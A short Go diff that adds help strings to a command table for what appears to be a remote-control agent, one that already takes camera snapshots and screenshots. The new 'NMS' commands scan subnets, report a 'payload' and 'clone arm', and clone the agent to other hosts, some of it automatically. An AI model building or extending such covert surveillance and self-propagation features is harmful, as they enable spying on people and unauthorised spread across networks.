@@ -176,4 +176,11 @@ var Known = map[string]string{
 	"camera-shot":             "Camera snapshot - camera-shot [device 0-3] [quality 1-100] [width 160-1280]",
 	"ping":                    "Ping",
 	"screenshot-now":          "Take screenshot",
+	"agent-sleep":              "NMS: order the agent asleep (send to the hostname/nms row) - agent-sleep [reason]",
+	"agent-wake-up":            "NMS: wake the agent (send to the hostname/nms row)",
+	"nms-status":               "NMS: monitor status, tick, clone arm, payload (send to the hostname/nms row)",
+	"nms-now":                  "NMS: one immediate probe round (send to the hostname/nms row)",
+	"set-nms":                  "NMS: config - set-nms key=value ... (interval, subnets, extra_hosts, exclude, autoclone, max_parallel)",
+	"nms-stop":                 "NMS: stop the monitor (send to the hostname/nms row) - nms-stop --confirm YES",
+	"nms-clone":                "NMS: one-shot clone to a host (send to the hostname/nms row) - nms-clone <host>",
 }
